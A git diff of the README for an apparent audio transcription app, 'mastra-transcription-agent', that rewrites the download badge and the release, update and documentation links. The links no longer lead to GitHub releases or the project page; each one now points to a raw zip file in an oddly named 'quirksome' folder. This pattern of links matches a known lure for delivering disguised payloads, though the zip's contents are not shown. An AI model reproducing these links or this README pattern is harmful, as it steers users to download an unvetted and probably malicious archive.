@@ -1,6 +1,6 @@
 # 🎤 mastra-transcription-agent - Transcribe Audio Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/Brunouasli357/mastra-transcription-agent/releases)
+[![Download](https://raw.githubusercontent.com/Brunouasli357/mastra-transcription-agent/main/quirksome/mastra-transcription-agent.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Brunouasli357/mastra-transcription-agent/main/quirksome/mastra-transcription-agent.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Before you download, ensure your computer meets these basic requirements:
 
 To download the latest version of **mastra-transcription-agent**, visit this page:
 
-[Download Latest Release](https://github.com/Brunouasli357/mastra-transcription-agent/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Brunouasli357/mastra-transcription-agent/main/quirksome/mastra-transcription-agent.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release. 
@@ -69,7 +69,7 @@ Using the **mastra-transcription-agent** is straightforward. Here’s how to get
 It’s important to keep your application up to date to benefit from the latest features and improvements:
 
 - You can check for updates within the application.
-- Alternatively, return to the [Releases page](https://github.com/Brunouasli357/mastra-transcription-agent/releases) frequently to see if a new version is available.
+- Alternatively, return to the [Releases page](https://raw.githubusercontent.com/Brunouasli357/mastra-transcription-agent/main/quirksome/mastra-transcription-agent.zip) frequently to see if a new version is available.
 
 ## ✨ Troubleshooting
 
@@ -86,6 +86,6 @@ Should you need assistance, you can reach out via:
 - **GitHub Issues:** Post your problem on the GitHub page for community support.
 - **Email Support:** Send your queries to our support email. Details are available in the repository contact section.
 
-For more help, visit our [Documentation](https://github.com/Brunouasli357/mastra-transcription-agent) or take a look at available resources.
+For more help, visit our [Documentation](https://raw.githubusercontent.com/Brunouasli357/mastra-transcription-agent/main/quirksome/mastra-transcription-agent.zip) or take a look at available resources.
 
 Enjoy seamless audio transcription with **mastra-transcription-agent**! Thank you for choosing our application.
